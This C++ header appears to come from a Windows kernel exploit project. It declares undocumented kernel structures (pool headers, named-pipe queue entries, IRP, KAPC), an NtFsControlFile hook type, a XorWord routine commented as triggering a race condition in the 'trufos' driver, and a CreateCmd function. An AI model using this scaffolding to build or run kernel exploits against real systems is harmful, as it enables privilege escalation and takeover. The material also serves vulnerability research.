#pragma once
#include <windows.h>
#include <winternl.h>
#include <iostream>

typedef void (IO_APC_ROUTINE)(
    void* ApcContext,
    _IO_STATUS_BLOCK* IoStatusBlock,
    unsigned long    reserved
    );

typedef int(__stdcall* NTFSCONTROLFILE)(
    HANDLE           fileHandle,
    HANDLE           Event,
    IO_APC_ROUTINE* apcRoutine,
    void* ApcContext,
    _IO_STATUS_BLOCK* ioStatusBlock,
    unsigned long    FsControlCode,
    void* InputBuffer,
    unsigned long    InputBufferLength,
    void* OutputBuffer,
    unsigned long    OutputBufferLength
    );

struct POOL_HEADER
{
    union
    {
        struct
        {
            USHORT PreviousSize : 8;                                          //0x0
            USHORT PoolIndex : 8;                                             //0x0
            USHORT BlockSize : 8;                                             //0x2
            USHORT PoolType : 8;                                              //0x2
        };
        ULONG Ulong1;                                                       //0x0
    };
    ULONG PoolTag;                                                          //0x4
    union
    {
        struct _EPROCESS* ProcessBilled;                                    //0x8
        struct
        {
            USHORT AllocatorBackTraceIndex;                                 //0x8
            USHORT PoolTagHash;                                             //0xa
        };
    };
};

struct DATA_QUEUE_ENTRY
{
    LIST_ENTRY NextEntry;
    void* Irp;
    void* SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
    char Data[];
};

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
    ULONG				Reserved3;
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 w018;
    WORD                 NameOffset;
    CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

struct _KDEVICE_QUEUE_ENTRY
{
    struct _LIST_ENTRY DeviceListEntry;                                     //0x0
    ULONG SortKey;                                                          //0x10
    UCHAR Inserted;                                                         //0x14
};

struct _KAPC
{
    UCHAR Type;                                                             //0x0
    union
    {
        UCHAR AllFlags;                                                     //0x1
        struct
        {
            UCHAR CallbackDataContext : 1;                                    //0x1
            UCHAR Unused : 7;                                                 //0x1
        };
    };
    UCHAR Size;                                                             //0x2
    UCHAR SpareByte1;                                                       //0x3
    ULONG SpareLong0;                                                       //0x4
    struct _KTHREAD* Thread;                                                //0x8
    struct _LIST_ENTRY ApcListEntry;                                        //0x10
    union
    {
        struct
        {
            VOID(*KernelRoutine)(struct _KAPC* arg1, VOID(**arg2)(VOID* arg1, VOID* arg2, VOID* arg3), VOID** arg3, VOID** arg4, VOID** arg5); //0x20
            VOID(*RundownRoutine)(struct _KAPC* arg1);                     //0x28
            VOID(*NormalRoutine)(VOID* arg1, VOID* arg2, VOID* arg3);      //0x30
        };
        VOID* Reserved[3];                                                  //0x20
    };
    VOID* NormalContext;                                                    //0x38
    VOID* SystemArgument1;                                                  //0x40
    VOID* SystemArgument2;                                                  //0x48
    CHAR ApcStateIndex;                                                     //0x50
    CHAR ApcMode;                                                           //0x51
    UCHAR Inserted;                                                         //0x52
};

struct IRP
{
    SHORT Type;                                                             //0x0
    USHORT Size;                                                            //0x2
    struct _MDL* MdlAddress;                                                //0x8
    ULONG Flags;                                                            //0x10
    union
    {
        struct _IRP* MasterIrp;                                             //0x18
        LONG IrpCount;                                                      //0x18
        VOID* SystemBuffer;                                                 //0x18
    } AssociatedIrp;                                                        //0x18
    struct _LIST_ENTRY ThreadListEntry;                                     //0x20
    struct _IO_STATUS_BLOCK IoStatus;                                       //0x30
    CHAR RequestorMode;                                                     //0x40
    UCHAR PendingReturned;                                                  //0x41
    CHAR StackCount;                                                        //0x42
    CHAR CurrentLocation;                                                   //0x43
    UCHAR Cancel;                                                           //0x44
    UCHAR CancelIrql;                                                       //0x45
    CHAR ApcEnvironment;                                                    //0x46
    UCHAR AllocationFlags;                                                  //0x47
    union
    {
        struct _IO_STATUS_BLOCK* UserIosb;                                  //0x48
        VOID* IoRingContext;                                                //0x48
    };
    struct _KEVENT* UserEvent;                                              //0x50
    union
    {
        struct
        {
            union
            {
                VOID(*UserApcRoutine)(VOID* arg1, struct _IO_STATUS_BLOCK* arg2, ULONG arg3); //0x58
                VOID* IssuingProcess;                                       //0x58
            };
            union
            {
                VOID* UserApcContext;                                       //0x60
                struct _IORING_OBJECT* IoRing;                              //0x60
            };
        } AsynchronousParameters;                                           //0x58
        union _LARGE_INTEGER AllocationSize;                                //0x58
    } Overlay;                                                              //0x58
    VOID(*CancelRoutine)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);  //0x68
    VOID* UserBuffer;                                                       //0x70
    union
    {
        struct
        {
            union
            {
                struct _KDEVICE_QUEUE_ENTRY DeviceQueueEntry;               //0x78
                VOID* DriverContext[4];                                     //0x78
            };
            struct _ETHREAD* Thread;                                        //0x98
            CHAR* AuxiliaryBuffer;                                          //0xa0
            struct _LIST_ENTRY ListEntry;                                   //0xa8
            union
            {
                struct _IO_STACK_LOCATION* CurrentStackLocation;            //0xb8
                ULONG PacketType;                                           //0xb8
            };
            struct _FILE_OBJECT* OriginalFileObject;                        //0xc0
        } Overlay;                                                          //0x78
        struct _KAPC Apc;                                                   //0x78
        VOID* CompletionKey;                                                //0x78
    } Tail;                                                                 //0x78
};

struct _CURDIR
{
    struct _UNICODE_STRING DosPath;                                         //0x0
    VOID* Handle;                                                           //0x10
};

//0x18 bytes (sizeof)
struct _RTL_DRIVE_LETTER_CURDIR
{
    USHORT Flags;                                                           //0x0
    USHORT Length;                                                          //0x2
    ULONG TimeStamp;                                                        //0x4
    struct _STRING DosPath;                                                 //0x8
};

//0x448 bytes (sizeof)
struct _RTL_USER_PROCESS_PARAMETERS2
{
    ULONG MaximumLength;                                                    //0x0
    ULONG Length;                                                           //0x4
    ULONG Flags;                                                            //0x8
    ULONG DebugFlags;                                                       //0xc
    VOID* ConsoleHandle;                                                    //0x10
    ULONG ConsoleFlags;                                                     //0x18
    VOID* StandardInput;                                                    //0x20
    VOID* StandardOutput;                                                   //0x28
    VOID* StandardError;                                                    //0x30
    struct _CURDIR CurrentDirectory;                                        //0x38
    struct _UNICODE_STRING DllPath;                                         //0x50
    struct _UNICODE_STRING ImagePathName;                                   //0x60
    struct _UNICODE_STRING CommandLine;                                     //0x70
    VOID* Environment;                                                      //0x80
    ULONG StartingX;                                                        //0x88
    ULONG StartingY;                                                        //0x8c
    ULONG CountX;                                                           //0x90
    ULONG CountY;                                                           //0x94
    ULONG CountCharsX;                                                      //0x98
    ULONG CountCharsY;                                                      //0x9c
    ULONG FillAttribute;                                                    //0xa0
    ULONG WindowFlags;                                                      //0xa4
    ULONG ShowWindowFlags;                                                  //0xa8
    struct _UNICODE_STRING WindowTitle;                                     //0xb0
    struct _UNICODE_STRING DesktopInfo;                                     //0xc0
    struct _UNICODE_STRING ShellInfo;                                       //0xd0
    struct _UNICODE_STRING RuntimeData;                                     //0xe0
    struct _RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];                  //0xf0
    ULONGLONG EnvironmentSize;                                              //0x3f0
    ULONGLONG EnvironmentVersion;                                           //0x3f8
    VOID* PackageDependencyData;                                            //0x400
    ULONG ProcessGroupId;                                                   //0x408
    ULONG LoaderThreads;                                                    //0x40c
    struct _UNICODE_STRING RedirectionDllName;                              //0x410
    struct _UNICODE_STRING HeapPartitionName;                               //0x420
    ULONGLONG* DefaultThreadpoolCpuSetMasks;                                //0x430
    ULONG DefaultThreadpoolCpuSetMaskCount;                                 //0x438
    ULONG DefaultThreadpoolThreadMaximum;                                   //0x43c
    ULONG HeapMemoryTypeMask;                                               //0x440
};

struct XorParams
{
    volatile unsigned __int16* AddressToXor;
    unsigned __int16 ValueToXor;
};

//Used to trigger race condition in trufos
void XorWord(XorParams* Params);

PPEB GetCurrentProcessPEB();

void CreateCmd();